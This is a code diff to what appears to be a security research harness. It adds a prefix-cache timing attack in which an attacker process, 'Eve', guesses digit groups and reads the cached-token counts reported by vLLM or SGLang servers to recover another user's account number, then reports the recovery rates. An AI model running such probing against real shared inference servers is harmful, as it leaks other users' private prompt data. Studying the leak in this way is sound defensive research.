@@ -165,6 +165,58 @@ def extract_attack(server: Server, model: str, mint: Minter, digits: int = 6, tr
     }
 
 
+def extract_blocks_attack(server: Server, model: str, mint: Minter, digits: int = 6, trials: int = 5,
+                          seed: int = 1, max_group: int = 3) -> dict:
+    """extract, for engines that cache and report whole blocks (vLLM: 16 tokens).
+
+    A single guessed digit only moves the cached count when it completes a
+    block, so Eve guesses groups: she tries every 1-digit continuation, then
+    every 2-digit one, and so on, until exactly one probe raises the cached
+    count above the rest. That group is Alice's, and she moves on. The last
+    group may end inside Alice's sentence, so those probes also carry the
+    sentence's known ending. Groups longer than max_group (10**max_group probes)
+    are given up: Eve's cost grows tenfold per digit she must guess at once.
+    """
+    rng = random.Random(seed)
+    tail = ". Please check my balance."
+    recovered, full, probes_used, flushed = [], 0, [], []
+    for _ in range(trials):
+        flushed.append(_flush(server))
+        system = _system(rng)
+        account = "".join(rng.choice("0123456789") for _ in range(digits))
+        _send(server, model, mint, "alice", "acme", system, f"My account number is {account}{tail}")
+        known, n_probes = "", 0
+        while len(known) < digits:
+            found = None
+            for size in range(1, min(max_group, digits - len(known)) + 1):
+                suffix = tail if len(known) + size == digits else ""
+                cands = [f"{n:0{size}d}" for n in range(10**size)]
+                rng.shuffle(cands)
+                cached = {}
+                for c in cands:
+                    cached[c] = _send(server, model, mint, "eve", "acme", system,
+                                      f"My account number is {known}{c}{suffix}").cached or 0
+                n_probes += len(cands)
+                top = max(cached.values())
+                best = [c for c in cands if cached[c] == top]
+                if len(best) == 1 and top > min(cached.values()):
+                    found = best[0]
+                    break
+            if found is None:
+                break  # Alice's next block needs more digits at once than Eve will try
+            known += found
+        recovered.append(len(known) if account.startswith(known) else 0)
+        full += known == account
+        probes_used.append(n_probes)
+    return {
+        "attack": "extract_blocks", "digits": digits, "trials": trials, "max_group": max_group,
+        "mean_digits_recovered": round(statistics.mean(recovered), 2),
+        "full_recovery_rate": round(full / trials, 3),
+        "mean_probes": round(statistics.mean(probes_used), 1),
+        "cache_flushed_between_trials": all(flushed),
+    }
+
+
 class HttpServer:
     """Minimal client for a running server (stdlib only)."""
 
@@ -186,15 +238,17 @@ class HttpServer:
 
 
 def flush_url(url: str) -> bool:
-    """POST /flush_cache. SGLang answers in plain text and refuses while
-    requests are in flight, so retry briefly."""
+    """Empty the server's prefix cache: POST /flush_cache (SGLang) or
+    /reset_prefix_cache (vLLM, dev mode). SGLang answers in plain text and
+    refuses while requests are in flight, so retry briefly."""
     for _ in range(10):
-        try:
-            with urllib.request.urlopen(urllib.request.Request(url.rstrip("/") + "/flush_cache", data=b"",
-                                                               method="POST"), timeout=30) as r:
-                if r.status == 200:
-                    return True
-        except (urllib.error.URLError, ConnectionError, TimeoutError):
-            pass
+        for path in ("/flush_cache", "/reset_prefix_cache"):
+            try:
+                with urllib.request.urlopen(urllib.request.Request(url.rstrip("/") + path, data=b"",
+                                                                   method="POST"), timeout=30) as r:
+                    if r.status == 200:
+                        return True
+            except (urllib.error.URLError, ConnectionError, TimeoutError):
+                pass
         time.sleep(0.5)
     return False
